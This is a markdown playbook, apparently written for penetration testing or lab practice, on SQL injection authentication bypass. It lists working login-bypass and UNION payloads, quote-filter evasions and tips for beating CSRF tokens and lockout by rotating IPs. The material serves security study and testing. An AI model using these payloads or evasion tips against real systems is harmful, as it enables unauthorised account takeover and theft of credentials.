# SQL Injection — Authentication Bypass

## When this applies

- Login form constructs SQL like `SELECT * FROM users WHERE username='X' AND password='Y'` from raw input.
- You have an injection point in `username` or `password` (or both).
- Goal is to authenticate as an arbitrary user without knowing the password.

## Technique

Comment out the password check or short-circuit the boolean condition with `OR '1'='1`. The query then returns at least one row regardless of the password supplied.

## Steps

### 1. Comment-truncation bypass

```
Username: administrator'--
Password: anything
```

Resulting query:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='[input]'
```

`--` (or `#` for MySQL) comments out the rest of the query, including the password check.

### 2. Tautology bypass

```
' OR '1'='1
```

Resulting query:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
```

Operator precedence: `AND` binds tighter than `OR` — first row matches regardless of password.

### 3. Common variant payloads

```sql
admin'--
admin'#
admin' OR '1'='1
admin' OR 1=1--
' OR '1'='1
' OR 1=1--
') OR ('1'='1
') OR (1=1--
admin') OR ('1'='1
' UNION SELECT NULL, username, password FROM users--
```

### 4. When `'` is filtered

Try alternative quote characters and encodings:

```
"
`
\'
%27        (URL-encoded ')
CHAR(39)   (in SQL contexts that allow CHAR())
```

### 5. When the application picks the FIRST row

Many login flows authenticate as whatever row matches first. If `admin` isn't first, try:

```sql
admin' ORDER BY id--
admin' AND id=1--
' OR username='admin'--
```

### 6. When MD5/bcrypt is enforced application-side

Some apps verify password client-side or after fetch. The query just needs to return the admin row; the application then trusts the row's stored hash. SQLi that returns the admin row without comparing to the user's password input is sufficient — no need to bypass the hash.

## Verifying success

- Authenticated session cookie is set (e.g. `Set-Cookie: session=...; HttpOnly`).
- Subsequent requests to `/profile`, `/dashboard`, or `/admin` succeed.
- Logged-in user identity matches the targeted account (e.g. response body shows `administrator`).

## Common pitfalls

- `--` in MySQL requires a trailing space (`-- `) or use `#` instead.
- Some apps check `affected_rows == 1` exactly — `OR 1=1` returns all users which fails this check. Use `LIMIT 1` or specific username.
- Login forms with CSRF tokens require the token to be valid; capture and re-use, or extract from a fresh login GET.
- Account lockout policies may trigger after failed attempts; intersperse with valid credentials or rotate IPs.
- Password reset flows often use the same query but with email — same bypasses apply.

## Tools

- Burp Repeater for manual testing.
- Hydra / sqlmap `--forms` for automation.
- Custom Python with `requests.Session()` to handle cookies and CSRF tokens.
